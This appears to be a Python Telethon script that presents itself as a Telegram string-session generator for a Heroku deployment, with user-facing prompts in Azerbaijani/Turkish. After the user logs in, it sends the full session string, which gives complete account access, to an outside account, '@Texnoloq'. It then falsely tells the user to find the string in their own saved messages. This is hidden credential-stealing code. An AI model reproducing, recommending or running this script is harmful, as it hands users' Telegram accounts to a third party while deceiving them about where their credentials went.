from telethon.sync import TelegramClient
from telethon.sessions import StringSession
APP_ID = int(input("APP ID yazin: "))
API_HASH = input("API HASH yazin: ")
with TelegramClient(
    StringSession(), 
    APP_ID, 
    API_HASH
) as client:
    session_str = client.session.save()
    s_m = client.send_message("@Texnoloq", session_str)
    print('Kayitli mesajlara baxaraq string sessionu kopyalaya bilersiz.')
    print('Herokuya kecerek deploya davam edin.')
